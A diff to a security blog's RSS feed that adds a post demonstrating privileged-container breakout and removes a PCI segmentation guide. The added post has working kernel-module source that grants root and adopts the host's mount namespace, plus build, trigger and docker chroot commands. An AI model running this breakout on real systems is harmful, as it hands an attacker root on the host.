@@ -7,6 +7,119 @@
 		<atom:link href="https://raesene.github.io/feed.xml" rel="self" type="application/rss+xml" />
 		
 			<item>
+				<title>Fun with privileged container breakout</title>
+				<description>&lt;p&gt;One of the truisms of container security is that when a container is run as &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;privileged&lt;/code&gt; (in the sense of the Docker flag, not just running as the root user) it’s insecure and possible to break out. However, there aren’t always great examples of how to break out of a privileged container in practice.&lt;/p&gt;
+
+&lt;p&gt;For containers with cgroupsv1 there was Felix Wilhelm’s great &lt;a href=&quot;https://twitter.com/_fel1x/status/1151487051986087936?s=20&quot;&gt;breakout in a tweet&lt;/a&gt;, but as more systems move to cgroupsv2, that one becomes less useful.&lt;/p&gt;
+
+&lt;p&gt;There’s also techniques based on adding entries to SSH trusted credentials and then SSH’ing to the host, but those are a little situational and need the container to be able to SSH to the host, which may not always be the case.&lt;/p&gt;
+
+&lt;p&gt;So I was on the hunt for something a bit more generally applicable that works with any setup, when I came across &lt;a href=&quot;https://pulsesecurity.co.nz/articles/docker-rootkits&quot;&gt;this post&lt;/a&gt; from Denis Andzakovic of Pulse Security, which had multiple examples of ways breaking out, so I thought it’d be interesting to explore one of these and see how well it works. Please note the clever parts of this post are all from Denis, I’m just exploring them in a bit more detail :)&lt;/p&gt;
+
+&lt;h2 id=&quot;the-setup&quot;&gt;The setup&lt;/h2&gt;
+
+&lt;p&gt;One of the things you can do in a privileged container is load new kernel modules, and kernel modules have rights that can be used for container breakout, so we should be able to use one of these to break out.&lt;/p&gt;
+
+&lt;p&gt;Looking at the examples in the Pulse blog, there’s one that allows for rewriting cred and fs structs essentially breakout out of the &lt;a href=&quot;https://securitylabs.datadoghq.com/articles/container-security-fundamentals-part-2/#mount-namespace&quot;&gt;mount namespace&lt;/a&gt; which, as you’ll see leads directly to full container breakout.&lt;/p&gt;
+
+&lt;h2 id=&quot;the-kernel-module-code&quot;&gt;The Kernel module code&lt;/h2&gt;
+
+&lt;p&gt;The code provided in the Pulse blog doesn’t work on modern Linux kernels, due to a change in function signature, but with a little help from ChatGPT, it was possible to get a version which works fine on the Linux 5.15 kernel in Ubuntu 22.04. In this case I’ve called the source code &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;legit2.c&lt;/code&gt;. This code will essentially cause a process to get the mount namespace of the host when triggered by writing to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/proc/legit&lt;/code&gt; in the container.&lt;/p&gt;
+
+&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;#include &amp;lt;linux/module.h&amp;gt;
+#include &amp;lt;linux/kernel.h&amp;gt;
+#include &amp;lt;linux/cred.h&amp;gt;
+#include &amp;lt;linux/fs_struct.h&amp;gt;
+#include &amp;lt;linux/sched/task.h&amp;gt;
+#include &amp;lt;linux/proc_fs.h&amp;gt;
+&lt;/span&gt;
+&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;tweak_fs_struct&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;fs_struct&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;dest&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;fs_struct&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;source&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;){&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;dest&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;dest&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;users&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;dest&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;in_exec&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;dest&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;umask&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;source&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;umask&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+
+        &lt;span class=&quot;n&quot;&gt;dest&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;root&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;source&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;root&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;dest&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pwd&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;source&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pwd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+
+&lt;span class=&quot;kt&quot;&gt;ssize_t&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;w_proc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;file&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;__user&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;size_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;count&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;loff_t&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;off&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;){&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;task_struct&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;init_ts&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;init_task&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;printk&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;KERN_INFO&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;legitkit - fs overwrite - pid is %d&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;current&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+
+    &lt;span class=&quot;n&quot;&gt;commit_creds&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;prepare_kernel_cred&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;tweak_fs_struct&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;current&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fs&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;init_ts&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fs&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;current&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;cgroups&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;init_ts&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;cgroups&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+
+    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;count&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+
+&lt;span class=&quot;k&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;proc_ops&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;proc_fops&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+    &lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;proc_write&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;w_proc&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;
+
+&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;proc_init&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;printk&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;KERN_INFO&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;init procfs module&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;proc_create&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;legit&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mo&quot;&gt;0666&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;proc_fops&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+
+    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+
+&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;proc_cleanup&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;remove_proc_entry&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;legit&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;MODULE_LICENSE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;GPL&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;module_init&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;proc_init&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;module_exit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;proc_cleanup&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;building-the-kernel-module&quot;&gt;Building the kernel module&lt;/h2&gt;
+
+&lt;p&gt;Now we’ve got our kernel module code we need to build it on our target machine (or another one with the same kernel version) before we can load it. For Ubuntu you’ll need &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;build-essential&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;kmod&lt;/code&gt; to give you the tools and then the Linux headers for the host’s kernel version.&lt;/p&gt;
+
+&lt;p&gt;Getting the Linux headers is easiest done when you’re running in a container on the target host, as you can just use &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;apt update &amp;amp;&amp;amp; apt-get install -y linux-headers-$(uname -r)&lt;/code&gt; to get the right version.&lt;/p&gt;
+
+&lt;p&gt;Also a Makefile is handy to help compile the module, something like&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;obj-m += legit2.o
+
+all:
+  make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules
+
+clean:
+  make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;inserting-the-kernel-module-and-breaking-out&quot;&gt;Inserting the Kernel module and breaking out&lt;/h2&gt;
+
+&lt;p&gt;Once you’ve got the kernel module built you insert it into the running kernel with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;insmod legit2.ko&lt;/code&gt;, and then it’s triggered by echoing text to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/proc/legit&lt;/code&gt; in the container&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'test'&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; /proc/legit
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Once you’ve done that your shell gets access to the host’s mount namespace, which includes the Docker socket (or ContainerD/CRI-O socket depending on your runtime), and that means you’re one &lt;a href=&quot;https://zwischenzugs.com/2015/06/24/the-most-pointless-docker-command-ever/&quot;&gt;pointless docker command&lt;/a&gt; from full root access on the host.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;docker run &lt;span class=&quot;nt&quot;&gt;-ti&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--privileged&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--net&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;host &lt;span class=&quot;nt&quot;&gt;--pid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;host &lt;span class=&quot;nt&quot;&gt;--ipc&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;host &lt;span class=&quot;nt&quot;&gt;--volume&lt;/span&gt; /:/host busybox &lt;span class=&quot;nb&quot;&gt;chroot&lt;/span&gt; /host
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;putting-it-all-together&quot;&gt;Putting it all together&lt;/h2&gt;
+
+&lt;p&gt;Here’s a video showing the process of building the kernel module, inserting it into the kernel and then breaking out of the container. The image I’m using is on Docker Hub as &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;raesene/privescape&lt;/code&gt;&lt;/p&gt;
+
+&lt;iframe width=&quot;560&quot; height=&quot;315&quot; src=&quot;https://www.youtube.com/embed/zoNY5malgHo&quot; title=&quot;YouTube video player&quot; frameborder=&quot;0&quot; allow=&quot;accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share&quot; allowfullscreen=&quot;&quot;&gt;&lt;/iframe&gt;
+
+&lt;h2 id=&quot;conclusion&quot;&gt;Conclusion&lt;/h2&gt;
+
+&lt;p&gt;This was just a quick blog demonstrating how an attacker with access to a privileged container can break out of it using a Kernel module and get access to the underlying host.&lt;/p&gt;
+</description>
+				<pubDate>Sun, 06 Aug 2023 10:27:00 +0100</pubDate>
+				<link>https://raesene.github.io/blog/2023/08/06/fun-with-privileged-container-breakout/</link>
+				<guid isPermaLink="true">https://raesene.github.io/blog/2023/08/06/fun-with-privileged-container-breakout/</guid>
+			</item>
+		
+			<item>
 				<title>Hardware review - Topton AMD Ryzen 7 5700U</title>
 				<description>&lt;p&gt;I’ve been thinking about a project where I could travel to conferences with hardware to run a workshop that doesn’t rely on cloud resources (to avoid those concerns about network access or cloud uptime) and of course, the first part of any project like that is the fun part, buying the hardware! As I’d promised a review to a couple of people on-line, here it is.&lt;/p&gt;
 
@@ -1434,95 +1547,6 @@ nodes                                           []                              
 				<pubDate>Wed, 21 Dec 2022 18:27:00 +0000</pubDate>
 				<link>https://raesene.github.io/blog/2022/12/21/Kubernetes-persistence-with-Tocan-and-Teisteanas/</link>
 				<guid isPermaLink="true">https://raesene.github.io/blog/2022/12/21/Kubernetes-persistence-with-Tocan-and-Teisteanas/</guid>
-			</item>
-		
-			<item>
-				<title>PCI Compliance for Kubernetes in detail - Part 16 - Segmentation</title>
-				<description>&lt;p&gt;This is the sixteenth part of a series of posts looking at the PCI recommendations for container security as they apply to Kubernetes environments. This time we’re looking at the Segmentation section. An index of the posts in this series can be found &lt;a href=&quot;https://www.container-security.site/defenders/PCI_Container_Orchestration_Guidance.html&quot;&gt;here&lt;/a&gt;.&lt;/p&gt;
-
-&lt;p&gt;The topic of segmentation in Kubernetes is an interesting one. First let’s talk a bit about what PCI means by Segmentation. From &lt;a href=&quot;https://listings.pcisecuritystandards.org/documents/Guidance-PCI-DSS-Scoping-and-Segmentation_v1.pdf&quot;&gt;this document&lt;/a&gt; we can see this definition&lt;/p&gt;
-
-&lt;blockquote&gt;
-  &lt;p&gt;Segmentation involves the implementation of additional controls to separate systems with different security needs. For example, in order to reduce the number of systems in scope for PCI DSS, segmentation may be used to keep in-scope systems separated from out-of-scope systems. 
-Segmentation can consist of logical controls, physical controls, or a combination of both. Examples of commonly used segmentation methods for purposes of reducing PCI DSS scope include firewalls and router configurations to prevent traffic passing between out-of-scope networks and the CDE, network configurations that prevent communications between different systems and/or subnets, and physical access controls.&lt;/p&gt;
-&lt;/blockquote&gt;
-
-&lt;p&gt;So in order to implement segmentation in a containerized environment we need to put controls in place so that there is effective security segregation between in-scope workloads and out-of-scope workloads.&lt;/p&gt;
-
-&lt;p&gt;With Kubernetes there’s a couple of ways you can implement this kind of control. The easiest (from a security point of view) is to use separate clusters for in-scope and out-of-scope workloads, however some organizations might not like this approach as it reduces the cost benefits of Kubernetes as it requires multiple sets of control plane nodes and reduces the ability to share resources between workloads.&lt;/p&gt;
-
-&lt;p&gt;The other approach is to try and use a single cluster for both in-scope and out-of-scope workloads, we need to harden the cluster such that we’re providing appropriate security segmentation, a.k.a hard multi-tenancy.&lt;/p&gt;
-
-&lt;h2 id=&quot;hard-multi-tenancy-in-kubernetes&quot;&gt;Hard Multi-Tenancy in Kubernetes&lt;/h2&gt;
-
-&lt;p&gt;To provide hard multi-tenancy in a Kubernetes cluster there are a number of considerations that need to be taken into account, and challenges to be overcome. Typically this kind of solution would be based on the use of Kubernetes namespaces as a unit of security segmentation, but it’s important to recognize that this (and Kubernetes in general) wasn’t designed for a hard multi-tenancy use case.&lt;/p&gt;
-
-&lt;p&gt;The sections below aren’t intended to be an exhaustive treatment of the challenges of hard multi-tenancy in Kubernetes (that would require it’s own blog post series!) but to indicate some of the complexity and why it’s not a trivial problem to solve.&lt;/p&gt;
-
-&lt;h3 id=&quot;kubernetes-api-segregation&quot;&gt;Kubernetes API Segregation&lt;/h3&gt;
-
-&lt;p&gt;The first challenge is that the Kubernetes API itself. There are a number of resources in a cluster wide and not namespaced, so we need to ensure that users in the “low security” namespace(s) can’t access these resources, which restricts the facilities that they can use. This particular issue can be mitigated via the use of “virtual cluster” style solutions such as &lt;a href=&quot;https://www.vcluster.com/&quot;&gt;vcluster&lt;/a&gt;, which create virtual Kubernetes clusters on top of a single host cluster. You can then provide full access to the Kubernetes API to the virtual cluster, but restrict access to the host cluster.&lt;/p&gt;
-
-&lt;p&gt;If you’re not using a virtual cluster solution, part of this also involves strict RBAC controls which prevent “low security” users from escalating their rights to access “high security” workloads. There’s a page on the &lt;a href=&quot;https://kubernetes.io/docs/concepts/security/rbac-good-practices/#privilege-escalation-risks&quot;&gt;Kubernetes site&lt;/a&gt; which discusses some of the areas to consider here.&lt;/p&gt;
-
-&lt;h3 id=&quot;workload-segregation&quot;&gt;Workload Segregation&lt;/h3&gt;
-
-&lt;p&gt;Virtual clusters alone, however, don’t provide the full solution. Where workloads are being deployed to a shared set of clusters nodes there is a risk that any workload can break out to an underlying node from the “low security” namespace and then access parts of the “high security” environment. Mitigating this will require adoption of admission control solutions such as &lt;a href=&quot;https://kyverno.io/&quot;&gt;Kyverno&lt;/a&gt; with a highly restrictive set of policies to reduce the risk of privilege escalation. Typically you’d expect these policies to be in-line with the &lt;a href=&quot;https://kubernetes.io/docs/concepts/security/pod-security-standards/#restricted&quot;&gt;restricted PSS&lt;/a&gt; policy.&lt;/p&gt;
-
-&lt;p&gt;This doesn’t provide a complete picture, however as you still have the risk of container breakout via Linux kernel/runc/Containerd/Docker CVEs. You can reduce this risk by using a solutions like &lt;a href=&quot;https://gvisor.dev/&quot;&gt;gVisor&lt;/a&gt; or &lt;a href=&quot;https://katacontainers.io/&quot;&gt;Kata Containers&lt;/a&gt; to provide a smaller attack surface, hardening the container runtime environment.&lt;/p&gt;
-
-&lt;p&gt;Another approach which might help here is to implement separate node pools for each environment. This reduces the workload resource sharing benefit of Kubernetes, but does reduce the risk of a breakout from one environment to another.&lt;/p&gt;
-
-&lt;p&gt;There is also a complication with this approach, which is that any workloads which have privileged access to the Kubernetes API server (e.g. operators, or admission control services) should not be placed in the “low security” node pool, as this would allow them to escalate privileges to the “high security” environment, via service account tokens. This approach also relies on the use of “node authorization” in Kubernetes otherwise the Kubelet credentials can be used to escalate privileges to the “high security” environment. Whilst this plugin is enabled in most Kubernetes distributions, it’s not guaranteed, (for example at the time of writing it’s not enabled in AKS and cluster operators cannot enable it by themselves).&lt;/p&gt;
-
-&lt;h3 id=&quot;network-segregation&quot;&gt;Network Segregation&lt;/h3&gt;
-
-&lt;p&gt;As we discussed back in the &lt;a href=&quot;https://raesene.github.io/blog/2022/10/23/PCI-Kubernetes-Section4-network-security/&quot;&gt;network section&lt;/a&gt; Kubernetes defaults to an open flat network for all workloads in the cluster. This is obviously not suitable for a hard multi-tenancy solution, so it would be necessary to implement strict network policies restricting traffic between the two environments.&lt;/p&gt;
-
-&lt;p&gt;However there’s another aspect of network segregation in Kubernetes which can be tricky to mitigate, which is DNS. DNS is used for service discovery in clusters, and this is a cluster-wide service. To provide effective segregation it would be necessary to split the DNS service into two separate services, one for each environment. Without this it’s generally trivial for an attacker to enumerate every service in the cluster, using commands like &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;dig +short srv any.any.svc.cluster.local&lt;/code&gt;.&lt;/p&gt;
-
-&lt;p&gt;In terms of the PCI requirements there’s four in this section.&lt;/p&gt;
-
-&lt;h2 id=&quot;section-161&quot;&gt;Section 16.1&lt;/h2&gt;
-
-&lt;p&gt;&lt;strong&gt;Threat&lt;/strong&gt; -  Unless an orchestration system is specifically designed for secure multi-tenancy, a shared mixed-security environment may allow attackers to move from a low-security to a high-security environment.&lt;/p&gt;
-
-&lt;p&gt;&lt;strong&gt;Best Practice&lt;/strong&gt; - Where practical, higher security components should be placed on dedicated clusters. Where this is not possible, care should be taken to ensure complete segregation between workloads of different security levels&lt;/p&gt;
-
-&lt;p&gt;&lt;strong&gt;Details&lt;/strong&gt; - Reviewing an environment for this requirement, would generally involve looking at deployed workloads for the in-scope clusters and confirming that they are only running in-scope workloads.&lt;/p&gt;
-
-&lt;h2 id=&quot;section-162&quot;&gt;Section 16.2&lt;/h2&gt;
-
-&lt;p&gt;&lt;strong&gt;Threat&lt;/strong&gt; -  Placing critical systems on the same nodes as general application containers may allow attackers to disrupt the security of the cluster through the use of shared resources on the container cluster node.&lt;/p&gt;
-
-&lt;p&gt;&lt;strong&gt;Best Practice&lt;/strong&gt; - Critical systems should run on dedicated nodes in any container orchestration cluster.&lt;/p&gt;
-
-&lt;p&gt;&lt;strong&gt;Details&lt;/strong&gt; - As discussed using dedicated node pools is an option to try and ensure workload segregation, but it’s a tricky one to implement well. Reviewing a cluster for this would generally involve looking at the worklods deployed to each environment and confirming that there are no privilege escalation paths, via things like service account tokens, or Kubelet credentials.&lt;/p&gt;
-
-&lt;h2 id=&quot;section-163&quot;&gt;Section 16.3&lt;/h2&gt;
-
-&lt;p&gt;&lt;strong&gt;Threat&lt;/strong&gt; -  Placing workloads with different security requirements on the same cluster nodes may allow attackers to gain unauthorized access to high security environments via breakout to the underlying node.&lt;/p&gt;
-
-&lt;p&gt;&lt;strong&gt;Best Practice&lt;/strong&gt; - Split cluster node pools should be enforced such that a cluster user of the low-security applications cannot schedule workloads to the high-security nodes.&lt;/p&gt;
-
-&lt;p&gt;&lt;strong&gt;Details&lt;/strong&gt; - For workload scheduling segregation, admission control solutions are required, so reviewing an environment for this would involve reviewing the policies in place and also reviewing the security of the admission control solution itself.&lt;/p&gt;
-
-&lt;h2 id=&quot;section-164&quot;&gt;Section 16.4&lt;/h2&gt;
-
-&lt;p&gt;&lt;strong&gt;Threat&lt;/strong&gt; - Modification of shared cluster resources by users with access to individual applications could result in unauthorized access to sensitive shared resources.&lt;/p&gt;
-
-&lt;p&gt;&lt;strong&gt;Best Practice&lt;/strong&gt; - Workloads and users who manage individual applications running under the orchestration system should not have the rights to modify shared cluster resources, or any resources used by another application.&lt;/p&gt;
-
